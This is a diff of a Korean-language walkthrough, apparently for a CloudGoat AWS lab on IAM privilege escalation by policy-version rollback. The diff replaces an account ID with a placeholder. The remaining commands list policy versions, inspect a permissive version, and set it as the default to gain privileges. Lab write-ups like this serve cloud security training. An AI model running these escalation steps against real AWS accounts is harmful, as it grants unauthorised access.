@@ -75,7 +75,7 @@ aws sts get-caller-identity
 
 ```bash
 "Arn": 
-	"arn:aws:iam::712987748923:user
+	"arn:aws:iam::<USERID>:user
 	raynor-iam_privesc_by_rollback_cgidesxwoc66a4"
 ```
 
@@ -121,7 +121,7 @@ aws iam list-policies \
 
 ```bash
 aws iam get-policy-version \
---policy-arn arn:aws:iam::712987748923:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4 \ 
+--policy-arn arn:aws:iam::<USERID>:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4 \ 
 --version-id "v1" \ 
 --profile bob1 \
 ```
@@ -155,7 +155,7 @@ aws iam get-policy-version \
 ### 취약한 정책 버전
 
 ```bash
-aws iam get-policy-version --policy-arn arn:aws:iam::712987748923:policy
+aws iam get-policy-version --policy-arn arn:aws:iam::<USERID>:policy
 /cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4 --version-id "v4" --profile bob1
 ```
 
@@ -168,7 +168,7 @@ aws iam get-policy-version --policy-arn arn:aws:iam::712987748923:policy
 ```bash
 aws iam \
  set-default-policy-version \ 
---policy-arn arn:aws:iam::712987748923:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4 \ 
+--policy-arn arn:aws:iam::<USERID>:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4 \ 
 --version-id v4 --profile bob1
 ```
 
